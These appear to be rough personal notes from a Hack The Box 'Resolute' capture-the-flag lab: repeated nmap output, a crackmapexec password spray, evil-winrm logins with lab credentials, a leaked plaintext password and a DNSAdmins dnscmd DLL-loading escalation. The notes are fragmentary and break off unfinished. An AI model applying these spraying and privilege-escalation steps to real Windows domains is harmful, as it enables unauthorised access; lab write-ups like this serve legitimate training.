# resolute

┌──(root㉿kali)-[/home/kali/Downloads/evil-winrm-3.4]
└─# nmap 10.129.96.155    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 01:50 EDT
Nmap scan report for 10.129.96.155
Host is up (0.29s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 3.26 seconds


┌──(root㉿kali)-[/home/kali/Downloads/evil-winrm-3.4]
└─# nmap 10.129.96.155    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 01:50 EDT
Nmap scan report for 10.129.96.155
Host is up (0.29s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 3.26 seconds

# smb enumeration

┌──(root㉿kali)-[/home/kali/Downloads/evil-winrm-3.4]
└─# nmap 10.129.96.155    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 01:50 EDT
Nmap scan report for 10.129.96.155
Host is up (0.29s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 3.26 seconds

┌──(root㉿kali)-[/home/kali/Downloads/evil-winrm-3.4]
└─# crackmapexec smb 10.129.96.155 -u marco -p 'Welcome123!'         
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marco:Welcome123! STATUS_LOGON_FAILURE 
              
# password spray

`crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!' --continue-on-success`

`evil-winrm -i 10.129.96.155 -P 5985 -u melanie -p 'Welcome123!'  `

```
evil-winrm -i 10.129.96.155 -P 5985 -u melanie -p 'Welcome123!'  
```

found info about powershell

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"                
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

# winrm shell

net user ryan

net localgroup "remote mangaement group"

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"                
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

got a note

whoami /groups



    Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

By default the DNSAdmins don’t have the ability to start or stop the DNS service, but it’s not unusual for an admin to give this group that privilege

dnscmmd

dnscmd.exe /config /serverlevelplugindll \\path\to\dll

load a dll using dnscmd

toomuch things to change but evil winrm not working

